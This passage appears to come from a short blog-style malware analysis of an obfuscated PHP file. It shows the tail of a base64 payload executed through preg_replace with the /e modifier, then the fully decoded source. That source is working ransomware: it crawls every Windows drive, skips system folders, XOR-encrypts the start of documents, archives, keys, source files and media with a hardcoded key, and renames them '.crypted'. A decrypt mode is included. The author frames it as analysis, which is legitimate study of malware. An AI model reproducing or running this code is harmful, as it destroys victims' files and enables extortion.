jbGFzc3xweXxwbHxofHZifHZjcHJvanx2YnByb2p8amF2YXxiYWt8YmFja3VwfG1kYnxhY2NkYnxtZGZ8b2RifHdkYnxjc3Z8dHN2fHNxbHxwc2R8ZXBzfGNkcnxjcHR8aW5kZHxkd2d8YWl8c3ZnfG1heHxza3B8c2NhZHxjYWR8M2RzfGJsZW5kfGx3b3xsd3N8bWJ8c2xkZHJ3fHNsZGFzbXxzbGRwcnR8dTNkfGpwZ3xqcGVnfHRpZmZ8dGlmfHJhd3xhdml8bXBnfG1wNHxtNHZ8bXBlZ3xtcGV8d21mfHdtdnx2ZWd8bW92fDNncHxmbHZ8bWt2fHZvYnxybXxtcDN8d2F2fGFzZnx3bWF8bTN1fG1pZGl8b2dnfG1pZHx2ZGl8dm1ka3x2aGR8ZHNrfGltZ3xpc28pJC9pJywkbykgfHwgJGE9PSdkJyYmcHJlZ19tYXRjaCgnL1suXShjcnlwdGVkKSQvaScsJG8pKQ0KCQl7DQoJCQkkZnA9QGZvcGVuKCRwLiRzLiRvLCdyKycpOw0KCQkJaWYgKCRmcCE9PWZhbHNlKQ0KCQkJew0KCQkJCSR4PUBmcmVhZCgkZnAsMTAyNCk7DQoJCQkJZm9yKCRpPTA7JGk8c3RybGVuKCR4KTskaSsrKSR4WyRpXT1jaHIob3JkKCR4WyRpXSleb3JkKCRrWyRpJXN0cmxlbigkayldKSk7DQoJCQkJQGZzZWVrKCRmcCwwKTsNCgkJCQlAZndyaXRlKCRmcCwkeCk7DQoJCQkJQGZjbG9zZSgkZnApOw0KDQoJCQkJaWYoJGE9PSdlJykNCgkJCQl7DQoJCQkJCUByZW5hbWUoJHAuJHMuJG8sICRwLiRzLiRvLicuY3J5cHRlZCcpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQlAcmVuYW1lKCRwLiRzLiRvLCBwcmVnX3JlcGxhY2UoJy9bLl1jcnlwdGVkJC8nLCAnJywgJHAuJHMuJG8pKTsNCgkJCQl9DQoJCQl9DQoJCX0NCgl9DQoNCglAY2xvc2VkaXIoJGRwKTsNCn0="));";$s109="/8b38221e975e7a9e6ef3c6ed6de0af5f/e";preg_replace($s109,$x438,"8b38221e975e7a9e6ef3c6ed6de0af5f"); ?>

So it seems that the variable contains the mayority of the code but is on base64. So lets decode it.

.. code:: php

    set_time_limit(0);

    for($i=67;$i<=90;$i++) if(@is_dir(chr($i).':')) Tree(chr($i).':');

    function Tree($p)
    {
        $a='e';
        $k=base64_decode('MWKTZJbIzBBUnANq/mTKmNwgb8ghwPgw8GDQUqf8JliKpAdqsCCQNoPQ+XDncNc+yBBY5EaonBCElPVWI3rRrO4wH1iRYMQoD3bdKIzw6CBYKI70QbYrMJgA9kCKQJLkyzahLGKY');
        $s=chr(92);

        if(preg_match('/'.$s.$s.'(winnt|boot|system|windows|tmp|temp|program|appdata|application|roaming|msoffice|temporary|cache)/i',$p) || preg_match('/recycle/i',$p)) return;

        $dp=@opendir($p);

        if($dp===false) return;

        while($o=@readdir($dp)) if($o!='.'&&$o!='..')
        {
                if (@is_dir($p.$s.$o))
                {
                        Tree($p.$s.$o);
                }
                elseif ($a=='e'&&preg_match('/[.](zip|rar|r00|r01|r02|r03|7z|tar|gz|gzip|arc|arj|bz|bz2|bza|bzip|bzip2|ice|xls|xlsx|doc|docx|pdf|djvu|fb2|rtf|ppt|pptx|pps|sxi|odm|odt|mpp|ssh|pub|gpg|pgp|kdb|kdbx|als|aup|cpr|npr|cpp|bas|asm|cs|php|pas|class|py|pl|h|vb|vcproj|vbproj|java|bak|backup|mdb|accdb|mdf|odb|wdb|csv|tsv|sql|psd|eps|cdr|cpt|indd|dwg|ai|svg|max|skp|scad|cad|3ds|blend|lwo|lws|mb|slddrw|sldasm|sldprt|u3d|jpg|jpeg|tiff|tif|raw|avi|mpg|mp4|m4v|mpeg|mpe|wmf|wmv|veg|mov|3gp|flv|mkv|vob|rm|mp3|wav|asf|wma|m3u|midi|ogg|mid|vdi|vmdk|vhd|dsk|img|iso)$/i',$o) || $a=='d'&&preg_match('/[.](crypted)$/i',$o))
                {
                        $fp=@fopen($p.$s.$o,'r+');
                        if ($fp!==false)
                        {
                                $x=@fread($fp,1024);
                                for($i=0;$i<strlen($x);$i++)$x[$i]=chr(ord($x[$i])^ord($k[$i%strlen($k)]));
                                @fseek($fp,0);
                                @fwrite($fp,$x);
                                @fclose($fp);

                                if($a=='e')
                                {
                                        @rename($p.$s.$o, $p.$s.$o.'.crypted');
                                }
                                else
                                {
                                        @rename($p.$s.$o, preg_replace('/[.]crypted$/', '', $p.$s.$o));
                                }
                        }
                }
        }

        @closedir($dp);
    }

Looks familiar to you? It seems that is mutation of Randsomware.

Happy analysis and comments are welcome!
